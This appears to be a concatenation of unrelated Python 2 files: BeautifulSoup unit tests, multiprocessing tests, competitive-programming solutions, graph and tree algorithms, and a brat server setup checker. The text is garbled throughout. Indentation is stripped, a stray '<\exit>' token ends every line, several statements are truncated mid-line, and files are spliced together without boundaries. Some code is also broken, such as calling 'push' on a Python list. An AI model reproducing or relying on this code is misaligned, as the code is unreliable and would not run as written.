html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(u"\N{SNOWMAN}", soup.b.decode_contents())<\exit>
def test_encode_contents(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(<\exit>
u"\N{SNOWMAN}".encode("utf8"), soup.b.encode_contents(<\exit>
encoding="utf8"))<\exit>
def test_deprecated_renderContents(self):<\exit>
html = u"<b>\N{SNOWMAN}</b>"<\exit>
soup = self.soup(html)<\exit>
self.assertEqual(<\exit>
u"\N{SNOWMAN}".encode("utf8"), soup.b.renderContents())<\exit>
class TestNavigableStringSubclasses(SoupTest):<\exit>
def test_cdata(self):<\exit>
soup = self.soup("")<\exit>
cdata = CData("foo")<\exit>
soup.insert(1, cdata)<\exit>
self.assertEqual(str(soup), "<![CDATA[foo]]>")<\exit>
self.assertEqual(soup.find(text="foo"), "foo")<\exit>
self.assertEqual(soup.contents[0], "foo")<\exit>
def test_cdata_is_never_formatted(self):<\exit>
self.count = 0<\exit>
def increment(*args):<\exit>
self.count += 1<\exit>
return "BITTER FAILURE"<\exit>
soup = self.soup("")<\exit>
cdata = CData("<><><>")<\exit>
soup.insert(1, cdata)<\exit>
self.assertEqual(<\exit>
b"<![CDATA[<><><>]]>", soup.encode(formatter=increment))<\exit>
self.assertEqual(1, self.count)<\exit>
def test_doctype_ends_in_newline(self):<\exit>
doctype = Doctype("foo")<\exit>
soup = self.soup("")<\exit>
soup.insert(1, doctype)<\exit>
self.assertEqual(soup.encode(), b"<!DOCTYPE foo>\n")<\exit>
class TestSoupSelector(TreeTest):<\exit>
HTML =<\exit>
def setUp(self):<\exit>
self.soup = BeautifulSoup(self.HTML)<\exit>
def assertSelects(self, selector, expected_ids):<\exit>
el_ids = [el['id'] for el in self.soup.select(selector)]<\exit>
el_ids.sort()<\exit>
expected_ids.sort()<\exit>
self.assertEqual(expected_ids, el_ids,<\exit>
"Selector %s, expected [%s], got [%s]" % (<\exit>
selector, ', '.join(expected_ids), ', '.join(el_ids)<\exit>
)<\exit>
)<\exit>
assertSelect = assertSelects<\exit>
def assertSelectMultiple(self, *tests):<\exit>
for selector, expected_ids in tests:<\exit>
self.assertSelect(selector, expected_ids)<\exit>
def test_one_tag_one(self):<\exit>
els = self.soup.select('title')<\exit>
self.assertEqual(len(els), 1)<\exit>
self.assertEqual(els[0].name, 'title')<\exit>
self.assertEqual(els[0].contents, [u'The title'])<\exit>
def test_one_tag_many(self):<\exit>
els = self.soup.select('div')<\exit>
self.assertEqual(len(els), 3)<\exit>
for div in els:<\exit>
self.assertEqual(div.name, 'div')<\exit>
def test_tag_in_tag_one(self):<\exit>
els = self.soup.select('div div')<\exit>
self.assertSelects('div div', ['inner'])<\exit>
def test_tag_in_tag_many(self):<\exit>
for selector in ('html div', 'html body div', 'body div'):<\exit>
self.assertSelects(selector, ['main', 'inner', 'footer'])<\exit>
def test_tag_no_match(self):<\exit>
self.assertEqual(len(self.soup.select('del')), 0)<\exit>
def test_invalid_tag(self):<\exit>
self.assertEqual(len(self.soup.select('tag%t')), 0)<\exit>
def test_header_tags(self):<\exit>
self.assertSelectMultiple(<\exit>
('h1', ['header1']),<\exit>
('h2', ['header2', 'header3']),<\exit>
)<\exit>
def test_class_one(self):<\exit>
for selector in ('.onep', 'p.onep', 'html p.onep'):<\exit>
els = self.soup.select(selector)<\exit>
self.assertEqual(len(els), 1)<\exit>
self.assertEqual(els[0].name, 'p')<\exit>
self.assertEqual(els[0]['class'], ['onep'])<\exit>
def test_class_mismatched_tag(self):<\exit>
els = self.soup.select('div.onep')<\exit>
self.assertEqual(len(els), 0)<\exit>
def test_one_id(self):<\exit>
for selector in ('div<\exit>
self.assertSelects(selector, ['inner'])<\exit>
def test_bad_id(self):<\exit>
els = self.soup.select('#doesnotexist')<\exit>
self.assertEqual(len(els), 0)<\exit>
def test_items_in_id(self):<\exit>
els = self.soup.select('div<\exit>
self.assertEqual(len(els), 3)<\exit>
for el in els:<\exit>
self.assertEqual(el.name, 'p')<\exit>
self.assertEqual(els[1]['class'], ['onep'])<\exit>
self.assertFalse(els[0].has_key('class'))<\exit>
def test_a_bunch_of_emptys(self):<\exit>
for selector in ('div<\exit>
self.assertEqual(len(self.soup.select(selector)), 0)<\exit>
def test_multi_class_support(self):<\exit>
for selector in ('.class1', 'p.class1', '.class2', 'p.class2',<\exit>
'.class3', 'p.class3', 'html p.class2', 'div<\exit>
self.assertSelects(selector, ['pmulti'])<\exit>
def test_multi_class_selection(self):<\exit>
for selector in ('.class1.class3', '.class3.class2',<\exit>
'.class1.class2.class3'):<\exit>
self.assertSelects(selector, ['pmulti'])<\exit>
def test_child_selector(self):<\exit>
self.assertSelects('.s1 > a', ['s1a1', 's1a2'])<\exit>
self.assertSelects('.s1 > a span', ['s1a2s1'])<\exit>
def test_attribute_equals(self):<\exit>
self.assertSelectMultiple(<\exit>
('p[class="onep"]', ['p1']),<\exit>
('p[id="p1"]', ['p1']),<\exit>
('[class="onep"]', ['p1']),<\exit>
('[id="p1"]', ['p1']),<\exit>
('link[rel="stylesheet"]', ['l1']),<\exit>
('link[type="text/css"]', ['l1']),<\exit>
('link[href="blah.css"]', ['l1']),<\exit>
('link[href="no-blah.css"]', []),<\exit>
('[rel="stylesheet"]', ['l1']),<\exit>
('[type="text/css"]', ['l1']),<\exit>
('[href="blah.css"]', ['l1']),<\exit>
('[href="no-blah.css"]', []),<\exit>
('p[href="no-blah.css"]', []),<\exit>
('[href="no-blah.css"]', []),<\exit>
)<\exit>
def test_attribute_tilde(self):<\exit>
self.assertSelectMultiple(<\exit>
('p[class~="class1"]', ['pmulti']),<\exit>
('p[class~="class2"]', ['pmulti']),<\exit>
('p[class~="class3"]', ['pmulti']),<\exit>
('[class~="class1"]', ['pmulti']),<\exit>
('[class~="class2"]', ['pmulti']),<\exit>
('[class~="class3"]', ['pmulti']),<\exit>
('a[rel~="friend"]', ['bob']),<\exit>
('a[rel~="met"]', ['bob']),<\exit>
('[rel~="friend"]', ['bob']),<\exit>
('[rel~="met"]', ['bob']),<\exit>
)<\exit>
def test_attribute_startswith(self):<\exit>
self.assertSelectMultiple(<\exit>
('[rel^="style"]', ['l1']),<\exit>
('link[rel^="style"]', ['l1']),<\exit>
('notlink[rel^="notstyle"]', []),<\exit>
('[rel^="notstyle"]', []),<\exit>
('link[rel^="notstyle"]', []),<\exit>
('link[href^="bla"]', ['l1']),<\exit>
('a[href^="http://"]', ['bob', 'me']),<\exit>
('[href^="http://"]', ['bob', 'me']),<\exit>
('[id^="p"]', ['pmulti', 'p1']),<\exit>
('[id^="m"]', ['me', 'main']),<\exit>
('div[id^="m"]', ['main']),<\exit>
('a[id^="m"]', ['me']),<\exit>
)<\exit>
def test_attribute_endswith(self):<\exit>
self.assertSelectMultiple(<\exit>
('[href$=".css"]', ['l1']),<\exit>
('link[href$=".css"]', ['l1']),<\exit>
('link[id$="1"]', ['l1']),<\exit>
('[id$="1"]', ['l1', 'p1', 'header1', 's1a1', 's2a1', 's1a2s1']),<\exit>
('div[id$="1"]', []),<\exit>
('[id$="noending"]', []),<\exit>
)<\exit>
def test_attribute_contains(self):<\exit>
self.assertSelectMultiple(<\exit>
('[rel*="style"]', ['l1']),<\exit>
('link[rel*="style"]', ['l1']),<\exit>
('notlink[rel*="notstyle"]', []),<\exit>
('[rel*="notstyle"]', []),<\exit>
('link[rel*="notstyle"]', []),<\exit>
('link[href*="bla"]', ['l1']),<\exit>
('a[href*="http://"]', ['bob', 'me']),<\exit>
('[href*="http://"]', ['bob', 'me']),<\exit>
('[id*="p"]', ['pmulti', 'p1']),<\exit>
('div[id*="m"]', ['main']),<\exit>
('a[id*="m"]', ['me']),<\exit>
('[href*=".css"]', ['l1']),<\exit>
('link[href*=".css"]', ['l1']),<\exit>
('link[id*="1"]', ['l1']),<\exit>
('[id*="1"]', ['l1', 'p1', 'header1', 's1a1', 's1a2', 's2a1', 's1a2s1']),<\exit>
('div[id*="1"]', []),<\exit>
('[id*="noending"]', []),<\exit>
('[href*="."]', ['bob', 'me', 'l1']),<\exit>
('a[href*="."]', ['bob', 'me']),<\exit>
('link[href*="."]', ['l1']),<\exit>
('div[id*="n"]', ['main', 'inner']),<\exit>
('div[id*="nn"]', ['inner']),<\exit>
)<\exit>
def test_attribute_exact_or_hypen(self):<\exit>
self.assertSelectMultiple(<\exit>
('p[lang|="en"]', ['lang-en', 'lang-en-gb', 'lang-en-us']),<\exit>
('[lang|="en"]', ['lang-en', 'lang-en-gb', 'lang-en-us']),<\exit>
('p[lang|="fr"]', ['lang-fr']),<\exit>
('p[lang|="gb"]', []),<\exit>
)<\exit>
def test_attribute_exists(self):<\exit>
self.assertSelectMultiple(<\exit>
('[rel]', ['l1', 'bob', 'me']),<\exit>
('link[rel]', ['l1']),<\exit>
('a[rel]', ['bob', 'me']),<\exit>
('[lang]', ['lang-en', 'lang-en-gb', 'lang-en-us', 'lang-fr']),<\exit>
('p[class]', ['p1', 'pmulti']),<\exit>
('[blah]', []),<\exit>
('p[blah]', []),<\exit>
)<\exit>
def test_select_on_element(self):<\exit>
inner = self.soup.find("div", id="main")<\exit>
selected = inner.select("div")<\exit>
self.assertSelectsIDs(selected, ['inner'])<\exit>
from unittest import TestCase<\exit>
import multiprocessing as mp<\exit>
import random<\exit>
import string<\exit>
class TestCounter(TestCase):<\exit>
def test_increment(self):<\exit>
pass<\exit>
def test_value(self):<\exit>
pass<\exit>
def cube(x):<\exit>
return x**3<\exit>
class TestMp(TestCase):<\exit>
def rand_string(self, length, output):<\exit>
rand_str = ''.join(random.choice(<\exit>
string.ascii_lowercase<\exit>
+ string.ascii_uppercase<\exit>
+ string.digits) for _ in range(length))<\exit>
output.put(rand_str)<\exit>
def test_generate_random_str(self):<\exit>
output = mp.Queue()<\exit>
processes = [mp.Process(target=self.rand_string, args=(5, output)) for x in range(4)]<\exit>
for p in processes:<\exit>
p.start()<\exit>
for p in processes:<\exit>
p.join()<\exit>
results = [output.get() for p in processes]<\exit>
self.assertEqual(len(results), 4)<\exit>
self.assertTrue(all(map(lambda x: len(x)==5, results)))<\exit>
def test_pool(self):<\exit>
expected = [1, 8, 27, 64, 125, 216]<\exit>
pool = mp.Pool(processes=4)<\exit>
results = [pool.apply(cube, args=(x,)) for x in range(1, 7)]<\exit>
self.assertEqual(results, expected)<\exit>
pool = mp.Pool(processes=4)<\exit>
results = pool.map(cube, range(1, 7))<\exit>
self.assertEqual(results, expected)<\exit>
pool = mp.Pool(processes=4)<\exit>
results = [pool.apply_async(cube, args=(x,)) for x in range(1, 7)]<\exit>
output = [p.get() for p in results]<\exit>
self.assertEqual(output, expected)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
total, n, lst = cipher<\exit>
f = [[0 for _ in xrange(n)] for _ in xrange(total + 1)]<\exit>
for i in xrange(n):<\exit>
if lst[i] < total + 1:<\exit>
f[lst[i]][i] = 1<\exit>
for k in xrange(1, total + 1):<\exit>
for i in reversed(xrange(n)):<\exit>
if k - lst[i] >= 0:<\exit>
f[k][i] += f[k - lst[i]][i]<\exit>
if i + 1 < n:<\exit>
f[k][i] += f[k][i + 1]<\exit>
return f[total][0]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N, M = map(int, f.readline().strip().split(' '))<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, M, lst<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
matrix, pattern = cipher<\exit>
R1, C1 = len(matrix), len(matrix[0])<\exit>
R2, C2 = len(pattern), len(pattern[0])<\exit>
dp = [[0 for _ in xrange(C1 + 1)] for _ in xrange(R1 + 1)]<\exit>
for i in xrange(1, R1 + 1):<\exit>
for j in xrange(1, C1 + 1):<\exit>
dp[i][j] = dp[i - 1][j] + dp[i][j - 1] - dp[i - 1][j - 1] + matrix[i - 1][j - 1]<\exit>
pattern_sum = sum([sum(pattern[i]) for i in xrange(R2)])<\exit>
for i in xrange(R1 - R2 + 1):<\exit>
for j in xrange(C1 - C2 + 1):<\exit>
bottom = i + R2<\exit>
left = j + C2<\exit>
candidate_sum = dp[bottom][left] - dp[bottom][j] - dp[i][left] + dp[i][j]<\exit>
if candidate_sum == pattern_sum:<\exit>
matched = True<\exit>
for a in xrange(R2):<\exit>
for b in xrange(C2):<\exit>
if matrix[i + a][j + b] != pattern[a][b]:<\exit>
matched = False<\exit>
break<\exit>
if not matched:<\exit>
break<\exit>
if matched:<\exit>
return "YES"<\exit>
return "NO"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
matrix = []<\exit>
pattern = []<\exit>
R, C = map(int, f.readline().strip().split(' '))<\exit>
for i in xrange(R):<\exit>
matrix.append(map(int, list(f.readline().strip())))<\exit>
R, C = map(int, f.readline().strip().split(' '))<\exit>
for i in xrange(R):<\exit>
pattern.append(map(int, list(f.readline().strip())))<\exit>
cipher = matrix, pattern<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
start_ptr = 0<\exit>
end_ptr = len(cipher) - 1<\exit>
cnt = 0<\exit>
while start_ptr < end_ptr:<\exit>
ord1 = ord(cipher[start_ptr]) - ord('a')<\exit>
ord2 = ord(cipher[end_ptr]) - ord('a')<\exit>
cnt += abs(ord1 - ord2)<\exit>
start_ptr += 1<\exit>
end_ptr -= 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
class Solution:<\exit>
def smallestDifference(self, A, B):<\exit>
A.sort()<\exit>
B.sort()<\exit>
ret = sys.maxint<\exit>
for a in A:<\exit>
idx = self.bin_search(a, B)<\exit>
ret = min(ret, abs(a-B[idx]))<\exit>
if idx+1<len(B):<\exit>
ret = min(ret, abs(a-B[idx+1]))<\exit>
return ret<\exit>
def bin_search(self, t, A):<\exit>
l = 0<\exit>
u = len(A)<\exit>
while l<u:<\exit>
m = (l+u)/2<\exit>
if A[m]==t:<\exit>
return m<\exit>
elif A[m]>t:<\exit>
u = m<\exit>
else:<\exit>
l = m+1<\exit>
return l-1<\exit>
if __name__=="__main__":<\exit>
print Solution().smallestDifference([3, 4, 6, 7], [2, 3, 8, 9])<\exit>
import signal<\exit>
def signal_handler(signum, frame):<\exit>
raise Exception("Timed out!")<\exit>
signal.signal(signal.SIGALRM, signal_handler)<\exit>
signal.alarm(10)<\exit>
try:<\exit>
while True:<\exit>
pass<\exit>
except Exception, msg:<\exit>
print "Timed out!"<\exit>
signal.alarm(0)<\exit>
import datetime<\exit>
class Timer(object):<\exit>
def __init__(self):<\exit>
self.s = None<\exit>
self.e = None<\exit>
def start(self):<\exit>
self.s = datetime.datetime.now()<\exit>
return self.s<\exit>
def end(self):<\exit>
self.e = datetime.datetime.now()<\exit>
return self.e - self.s<\exit>
class DirectedGraphNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.neighbors = []<\exit>
class Solution:<\exit>
def topSort_error(self, graph):<\exit>
node2neighbors = {}<\exit>
for node in graph:<\exit>
node2neighbors[node] = set(node.neighbors)<\exit>
def cmp(a, b):<\exit>
if a in node2neighbors[b]:<\exit>
return 1<\exit>
if b in node2neighbors[a]:<\exit>
return -1<\exit>
return 0<\exit>
graph.sort(cmp=cmp)<\exit>
return graph<\exit>
def topSort_normal(self, graph):<\exit>
pi = {}<\exit>
for node in graph:<\exit>
pi[node] = set()<\exit>
for node in graph:<\exit>
for nbr in node.neighbors:<\exit>
pi[nbr].add(node)<\exit>
ret = []<\exit>
while graph:<\exit>
i = 0<\exit>
while i<len(graph):<\exit>
if len(pi[graph[i]])!=0:<\exit>
i += 1<\exit>
else:<\exit>
ret.append(graph[i])<\exit>
for nbr in graph[i].neighbors:<\exit>
if graph[i] in pi[nbr]:<\exit>
pi[nbr].remove(graph[i])<\exit>
graph.pop(i)<\exit>
return ret<\exit>
def topSort(self, graph):<\exit>
unvisited = set(graph)<\exit>
ret = []<\exit>
while unvisited:<\exit>
cur = unvisited.copy().pop()<\exit>
self.dfs(cur, unvisited, ret)<\exit>
return ret<\exit>
def dfs(self, cur, unvisited, ret):<\exit>
for nbr in cur.neighbors:<\exit>
if nbr in unvisited:<\exit>
self.dfs(nbr, unvisited, ret)<\exit>
ret.push(0, cur)<\exit>
unvisited.remove(cur)<\exit>
from __future__ import generators<\exit>
__version__ = '$Revision: 0.9 $'<\exit>
__date__ = '$Date: 2007/03/27 04:15:26 $'<\exit>
__credits__ =<\exit>
try:<\exit>
set<\exit>
except NameError:<\exit>
from sets import Set as set<\exit>
from rad_util import is_rotated<\exit>
class CycleError(Exception):<\exit>
pass<\exit>
def topsort(pairlist):<\exit>
num_parents = {}<\exit>
children = {}<\exit>
for parent, child in pairlist:<\exit>
if not num_parents.has_key( parent ):<\exit>
num_parents[parent] = 0<\exit>
if not num_parents.has_key( child ):<\exit>
num_parents[child] = 0<\exit>
num_parents[child] += 1<\exit>
children.setdefault(parent, []).append(child)<\exit>
answer = [x for x in num_parents.keys() if num_parents[x] == 0]<\exit>
for parent in answer:<\exit>
del num_parents[parent]<\exit>
if children.has_key( parent ):<\exit>
for child in children[parent]:<\exit>
num_parents[child] -= 1<\exit>
if num_parents[child] == 0:<\exit>
answer.append( child )<\exit>
del children[parent]<\exit>
if num_parents:<\exit>
raise CycleError(answer, num_parents, children)<\exit>
return answer<\exit>
def topsort_levels(pairlist):<\exit>
num_parents = {}<\exit>
children = {}<\exit>
for parent, child in pairlist:<\exit>
if not num_parents.has_key( parent ):<\exit>
num_parents[parent] = 0<\exit>
if not num_parents.has_key( child ):<\exit>
num_parents[child] = 0<\exit>
num_parents[child] += 1<\exit>
children.setdefault(parent, []).append(child)<\exit>
return topsort_levels_core(num_parents, children)<\exit>
def topsort_levels_core(num_parents, children):<\exit>
while 1:<\exit>
level_parents = [x for x in num_parents.keys() if num_parents[x] == 0]<\exit>
if not level_parents:<\exit>
break<\exit>
yield level_parents<\exit>
for level_parent in level_parents:<\exit>
del num_parents[level_parent]<\exit>
if children.has_key(level_parent):<\exit>
for level_parent_child in children[level_parent]:<\exit>
num_parents[level_parent_child] -= 1<\exit>
del children[level_parent]<\exit>
if num_parents:<\exit>
raise CycleError(num_parents, children)<\exit>
else:<\exit>
raise StopIteration<\exit>
def find_cycles(parent_children):<\exit>
cycles = []<\exit>
visited_nodes = set()<\exit>
for parent in parent_children:<\exit>
if parent in visited_nodes:<\exit>
continue<\exit>
paths = [[parent]]<\exit>
while paths:<\exit>
path = paths.pop()<\exit>
parent = path[-1]<\exit>
try:<\exit>
children = parent_children[parent]<\exit>
except KeyError:<\exit>
continue<\exit>
for child in children:<\exit>
if child in path:<\exit>
cycle = path[path.index(child):]<\exit>
is_dup = False<\exit>
for other_cycle in cycles:<\exit>
if is_rotated(other_cycle, cycle):<\exit>
is_dup = True<\exit>
break<\exit>
if not is_dup:<\exit>
cycles.append(cycle)<\exit>
yield cycle<\exit>
else:<\exit>
paths.append(path + [child])<\exit>
visited_nodes.add(child)<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
import doctest<\exit>
doctest.testmod(sys.modules['__main__'])<\exit>
import heapq<\exit>
class Cell:<\exit>
def __init__(self, i, j, h):<\exit>
self.i = i<\exit>
self.j = j<\exit>
self.h = h<\exit>
def __cmp__(self, other):<\exit>
return self.h - other.h<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]<\exit>
def trapRainWater(self, mat):<\exit>
if not mat: return 0<\exit>
m, n = len(mat), len(mat[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
h = []<\exit>
for i in xrange(m):<\exit>
visited[i][0] = True<\exit>
heapq.heappush(h, Cell(i, 0, mat[i][0]))<\exit>
visited[i][n-1] = True<\exit>
heapq.heappush(h, Cell(i, n-1, mat[i][n-1]))<\exit>
for j in xrange(1, n-1):<\exit>
visited[0][j] = True<\exit>
heapq.heappush(h, Cell(0, j, mat[0][j]))<\exit>
visited[m-1][j] = True<\exit>
heapq.heappush(h, Cell(m-1, j, mat[m-1][j]))<\exit>
trapped = 0<\exit>
while h:<\exit>
cur = heapq.heappop(h)<\exit>
for dir in self.dirs:<\exit>
I, J = cur.i+dir[0], cur.j+dir[1]<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J]:<\exit>
nxt = Cell(I, J, mat[I][J])<\exit>
if nxt.h < cur.h:<\exit>
trapped += cur.h - nxt.h<\exit>
nxt.h = cur.h<\exit>
visited[I][J] = True<\exit>
heapq.heappush(h, nxt)<\exit>
return trapped<\exit>
if __name__ == "__main__":<\exit>
assert Solution().trapRainWater([<\exit>
[12, 13, 0, 12],<\exit>
[13, 4, 13, 12],<\exit>
[13, 8, 10, 12],<\exit>
[12, 13, 12, 12],<\exit>
[13, 13, 13, 13]]<\exit>
) == 14<\exit>
assert Solution().trapRainWater([[9, 1, 10, 10], [9, 1, 2, 8], [2, 6, 5, 0], [6, 0, 9, 0]]) == 0<\exit>
class TreeNode(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Traverser(object):<\exit>
def morris_inorder(self, root):<\exit>
cur = root<\exit>
while cur:<\exit>
if not cur.left:<\exit>
self.consume(cur)<\exit>
cur = cur.right<\exit>
else:<\exit>
pre = cur.left<\exit>
while pre.right and pre.right != cur:<\exit>
pre = pre.right<\exit>
if not pre.right:<\exit>
pre.right = cur<\exit>
cur = cur.left<\exit>
else:<\exit>
pre.right = None<\exit>
self.consume(cur)<\exit>
cur = cur.right<\exit>
def morris_preorder(self, root):<\exit>
cur = root<\exit>
while cur:<\exit>
if not cur.left:<\exit>
self.consume(cur)<\exit>
cur = cur.right<\exit>
else:<\exit>
pre = cur.left<\exit>
while pre.right and pre.right != cur:<\exit>
pre = pre.right<\exit>
if not pre.right:<\exit>
pre.right = cur<\exit>
self.consume(cur)<\exit>
cur = cur.left<\exit>
else:<\exit>
pre.right = None<\exit>
cur = cur.right<\exit>
def morris_postorder(self, root):<\exit>
dummy = TreeNode(0)<\exit>
dummy.left = root<\exit>
cur = dummy<\exit>
while cur:<\exit>
if not cur.left:<\exit>
cur = cur.right<\exit>
else:<\exit>
pre = cur.left<\exit>
while pre.right and pre.right != cur:<\exit>
pre = pre.right<\exit>
if not pre.right:<\exit>
pre.right = cur<\exit>
cur = cur.left<\exit>
else:<\exit>
pre.right = None<\exit>
self.consume_path(cur.left, pre)<\exit>
cur = cur.right<\exit>
def _reverse(self, fr, to):<\exit>
if fr == to: return<\exit>
cur = fr<\exit>
nxt = cur.right<\exit>
while cur and nxt and cur != to:<\exit>
nxt.right, cur, nxt = cur, nxt, nxt.right<\exit>
def consume_path(self, fr, to):<\exit>
self._reverse(fr, to)<\exit>
cur = to<\exit>
self.consume(cur)<\exit>
while cur != fr:<\exit>
cur = cur.right<\exit>
self.consume(cur)<\exit>
self._reverse(to, fr)<\exit>
def consume(self, node):<\exit>
print node.val<\exit>
if __name__ == "__main__":<\exit>
root = TreeNode(6)<\exit>
root.left = TreeNode(2)<\exit>
root.left.left = TreeNode(1)<\exit>
root.left.right = TreeNode(4)<\exit>
root.left.right.left = TreeNode(3)<\exit>
root.left.right.right = TreeNode(5)<\exit>
root.right = TreeNode(7)<\exit>
root.right.right = TreeNode(9)<\exit>
root.right.right.left = TreeNode(8)<\exit>
traverser = Traverser()<\exit>
print traverser.morris_inorder.__name__<\exit>
traverser.morris_inorder(root)<\exit>
print traverser.morris_preorder.__name__<\exit>
traverser.morris_preorder(root)<\exit>
print traverser.morris_postorder.__name__<\exit>
traverser.morris_postorder(root)<\exit>
class Solution:<\exit>
def triangleCount(self, S):<\exit>
S.sort()<\exit>
cnt = 0<\exit>
for h in xrange(len(S)-1, 1, -1):<\exit>
s = 0<\exit>
e = h-1<\exit>
while s<e:<\exit>
if S[s]+S[e]>S[h]:<\exit>
cnt += e-s<\exit>
e -= 1<\exit>
else:<\exit>
s += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
assert Solution().triangleCount([3, 4, 6, 7]) == 3<\exit>
from httplib import HTTPConnection, HTTPSConnection<\exit>
from httplib import FORBIDDEN, MOVED_PERMANENTLY, NOT_FOUND, OK, TEMPORARY_REDIRECT<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
CONNECTION_BY_SCHEME = {<\exit>
'http': HTTPConnection,<\exit>
'https': HTTPSConnection,<\exit>
}<\exit>
def _request_wrap(conn, method, url, body=None,<\exit>
headers=None):<\exit>
depth = 0<\exit>
curr_conn = conn<\exit>
curr_url = url<\exit>
while depth < 100:<\exit>
curr_conn.request(method, curr_url, body,<\exit>
headers=headers if headers is not None else {})<\exit>
res = curr_conn.getresponse()<\exit>
if res.status not in (MOVED_PERMANENTLY, TEMPORARY_REDIRECT, ):<\exit>
return res<\exit>
res.read()<\exit>
res_headers = dict(res.getheaders())<\exit>
url_soup = urlparse(res_headers['location'])<\exit>
try:<\exit>
curr_conn = CONNECTION_BY_SCHEME[url_soup.scheme](url_soup.netloc)<\exit>
except KeyError:<\exit>
assert False, 'redirected to unknown scheme, dying'<\exit>
curr_url = url_soup.path<\exit>
depth += 1<\exit>
assert False, 'redirects and moves lead us astray, dying'<\exit>
def main(args):<\exit>
if len(args) != 2:<\exit>
print >> stderr, 'Usage: %s url_to_brat_installation' % (args[0], )<\exit>
return -1<\exit>
brat_url = args[1]<\exit>
url_soup = urlparse(brat_url)<\exit>
if url_soup.scheme:<\exit>
try:<\exit>
Connection = CONNECTION_BY_SCHEME[url_soup.scheme.split(':')[0]]<\exit>
except KeyError:<\exit>
print >> stderr, ('ERROR: Unknown url scheme %s, try http or '<\exit>
'https') % url_soup.scheme<\exit>
return -1<\exit>
else:<\exit>
path_soup = url_soup.path.split('/')<\exit>
assumed_netloc = path_soup[0]<\exit>
assumed_path = '/' + '/'.join(path_soup[1:])<\exit>
print >> stderr, ('WARNING: No url scheme given, assuming scheme: '<\exit>
'"http", netloc: "%s" and path: "%s"'<\exit>
) % (assumed_netloc, assumed_path, )<\exit>
url_soup = url_soup._replace(scheme='http', netloc=assumed_netloc,<\exit>
path=assumed_path)<\exit>
Connection = HTTPConnection<\exit>
conn = Connection(url_soup.netloc)<\exit>
res = _request_wrap(conn, 'HEAD', url_soup.path)<\exit>
if res.status != OK:<\exit>
print >> stderr, ('Unable to load "%s", please check the url.'<\exit>
) % (brat_url, )<\exit>
print >> stderr, ('Does the url you provdide point to your brat '<\exit>
'installation?')<\exit>
return -1<\exit>
res.read()<\exit>
ajax_cgi_path = url_soup.path + '/ajax.cgi'<\exit>
ajax_cgi_url = url_soup._replace(path=ajax_cgi_path).geturl()<\exit>
res = _request_wrap(conn, 'HEAD', ajax_cgi_path)<\exit>
if res.status == FORBIDDEN:<\exit>
print >> stderr, ('Received forbidden (403) when trying to access '<\exit>
'"%s"') % (ajax_cgi_url, )<\exit>
print ('Have you perhaps forgotten to enable execution of CGI in '<\exit>
' your web server configuration?')<\exit>
return -1<\exit>
elif res.status != OK:<\exit>
print >> stderr, ('Unable to load "%s", please check your url. Does '<\exit>
'it point to your brat installation?') % (ajax_cgi_url, )<\exit>
return -1<\exit>
res_headers = dict(res.getheaders())<\exit>
try:<\exit>
content_type = res_headers['content-type']<\exit>
except KeyError:<\exit>
content_type = None<\exit>
if content_type != 'application/json':<\exit>
print >> stderr, ('Didn\'t receive json data when accessing "%s"%s.'<\exit>
) % (ajax_cgi_url,<\exit>
', instead we received %s' % content_type<\exit>
if content_type is not None else '')<\exit>
print >> stderr, ('Have you perhaps forgotten to add a handler for '<\exit>
'CGI in your web server configuration?')<\exit>
return -1<\exit>
print 'Congratulations! Your brat server appears to be ready to run.'<\exit>
print ('However, there is the possibility that there are further errors, '<\exit>
'but at least the server should be capable of communicating '<\exit>
'these errors to the client.')<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, A, B = cipher<\exit>
A.sort()<\exit>
B.sort(reverse=True)<\exit>
for i in xrange(N):<\exit>
if not A[i] + B[i] >= K:<\exit>
return "NO"<\exit>
return "YES"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N, K = map(int, f.readline().strip().split(" "))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
B = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, K, A, B<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
a = map(set, cipher)<\exit>
ret = a[0].intersection(a[1])<\exit>
if len(ret) > 0:<\exit>
return "YES"<\exit>
else:<\exit>
return "NO"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = []<\exit>
cipher.append(f.readline().strip())<\exit>
cipher.append(f.readline().strip())<\exit>
